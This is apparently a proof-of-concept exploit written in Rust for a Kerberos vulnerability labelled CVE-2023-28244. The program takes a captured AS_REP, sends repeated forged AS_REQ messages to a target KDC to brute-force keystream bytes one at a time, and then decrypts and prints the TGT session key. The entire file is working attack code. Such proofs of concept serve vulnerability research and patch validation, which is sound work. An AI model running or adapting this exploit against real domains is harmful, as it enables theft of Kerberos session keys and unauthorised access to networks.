use std::{
    fs::File,
    io::{self, BufReader, Read},
    net::SocketAddr,
    path::PathBuf,
};

use clap::Parser;
use indicatif::{ProgressBar, ProgressFinish};
use cve_2023_28244::{
    AsReqExt, Client, EncryptedTimestamp, KdcFrame, Keystream, ERR_GENERIC,
    ERR_PREAUTH_FAILED,
};
use pretty_hex::PrettyHex;
use rasn::der;
use rasn_kerberos::{AsRep, AsReq};

/// Exploit for Kerberos Session Key Recovery From RC4-MD4 Encrypted AS_REP
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Address:Port of target KDC
    target: SocketAddr,

    /// Realm
    #[arg(short, long)]
    realm: String,

    /// Username
    #[arg(short, long)]
    username: String,

    /// Path to AS_REP file
    #[arg(short, long)]
    filepath: PathBuf,
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let args = Args::parse();
    let mut client = Client::connect(args.target).await?;

    let file = File::open(args.filepath)?;
    let buf_reader = BufReader::new(file);
    let buf: Vec<u8> = buf_reader.bytes().flatten().collect();
    let as_rep: AsRep = der::decode(&buf).unwrap();
    let mut keystream = Keystream::from_as_rep_aes128(&as_rep).unwrap();
    println!(
        "Recovered {} bytes of keystream from AS_REP",
        &keystream.len()
    );
    assert!(keystream.len() >= 45);

    let enc_ts = EncryptedTimestamp::now(&keystream);
    let as_req = AsReq::new_rc4md4_with_ts(
        args.realm.to_owned(),
        args.username.to_owned(),
        enc_ts.into(),
    );
    let rep = client.send_as_req(as_req).await.unwrap();
    match rep {
        KdcFrame::AsRep(_as_rep) => {
            println!("Keystream worked to encrypt a valid AS_REQ!");
        }
        _ => {
            panic!("Keystream failed AS_REQ check, aborting!");
            //println!("Keystream not working... trying anyway");
        }
    }

    //for i in 0..16 {
    while keystream.len() < 61 {
        //dbg!(&keystream.len());
        let pb = ProgressBar::new(256).with_finish(ProgressFinish::AndClear);
        for (enc_ts, last_byte) in EncryptedTimestamp::iter_last_byte(&keystream) {
            let as_req = AsReq::new_rc4md4_with_ts(
                args.realm.to_owned(),
                args.username.to_owned(),
                enc_ts.into(),
            );
            let rep = client.send_as_req(as_req).await.unwrap();
            pb.inc(1);
            match rep {
                // ERR_GENERIC (60) means did not deserialize correctly
                KdcFrame::KrbError(krb_error) if krb_error.error_code == ERR_GENERIC => (),
                KdcFrame::AsRep(_) => {
                    let i = keystream.len();
                    pb.finish_and_clear();
                    println!("keystream[{i}] = {last_byte:#04x?}");
                    keystream.push(last_byte);
                    break;
                }
                KdcFrame::KrbError(krb_error) if krb_error.error_code == ERR_PREAUTH_FAILED => {
                    panic!("Something is wrong with the keystream!")
                }
                _ => panic!("Unexpected error!"),
            }
        }
    }
    //dbg!(&keystream);
    let mut buf = as_rep.0.enc_part.cipher[..61].to_vec();
    keystream.apply(&mut buf);
    let tgt_session_key = &buf[45..61];
    println!(
        "Decrypted TGT Session Key:\n{:?}",
        tgt_session_key.hex_dump()
    );
    Ok(())
}
